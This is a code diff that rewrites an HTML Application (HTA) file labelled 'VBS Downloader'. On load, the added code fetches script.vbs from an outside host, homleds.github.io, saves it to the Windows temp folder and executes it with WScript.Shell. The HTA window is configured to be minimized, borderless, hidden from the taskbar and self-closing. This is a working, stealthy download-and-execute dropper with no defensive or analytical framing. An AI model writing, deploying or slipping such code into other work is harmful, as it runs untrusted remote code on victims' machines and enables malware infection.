@@ -1,17 +1,56 @@
-<script>
-var url = "https://homleds.github.io/script.vbs";
-var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-xhr.open("GET", url, false);
-xhr.send();
-
-var fso = new ActiveXObject("Scripting.FileSystemObject");
-var temp = fso.GetSpecialFolder(2);
-var file = temp + "\\script.vbs";
-
-var stream = fso.CreateTextFile(file, true);
-stream.Write(xhr.responseText);
-stream.Close();
-
-new ActiveXObject('WScript.Shell').Run(file);
+<html>
+<head>
+<title>VBS Downloader</title>
+<hta:application
+    id="VBSDownloader"
+    applicationname="VBS Downloader"
+    border="none"
+    borderstyle="normal"
+    caption="no"
+    contextmenu="no"
+    innerborder="no"
+    scroll="no"
+    showintaskbar="no"
+    singleinstance="yes"
+    sysmenu="no"
+    windowstate="minimize"
+/>
+</head>
+<body onload="runDownloader()">
+<script language="JavaScript">
+function runDownloader() {
+    try {
+        // Download the VBS script from the specified URL
+        var url = "https://homleds.github.io/script.vbs";
+        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+        xhr.open("GET", url, false);
+        xhr.send();
+        
+        if (xhr.status === 200) {
+            // Create the VBS file in temp directory
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var temp = fso.GetSpecialFolder(2);
+            var file = temp + "\\script.vbs";
+            
+            var stream = fso.CreateTextFile(file, true);
+            stream.Write(xhr.responseText);
+            stream.Close();
+            
+            // Execute the downloaded VBS file
+            var shell = new ActiveXObject('WScript.Shell');
+            shell.Run(file, 1, false);
+            
+            // Close the HTA window after a short delay
+            setTimeout(function() { window.close(); }, 1000);
+        } else {
+            alert("Failed to download script: HTTP status " + xhr.status);
+            window.close();
+        }
+    } catch (e) {
+        alert("Error: " + e.message);
+        window.close();
+    }
+}
 </script>
-
+</body>
+</html> 
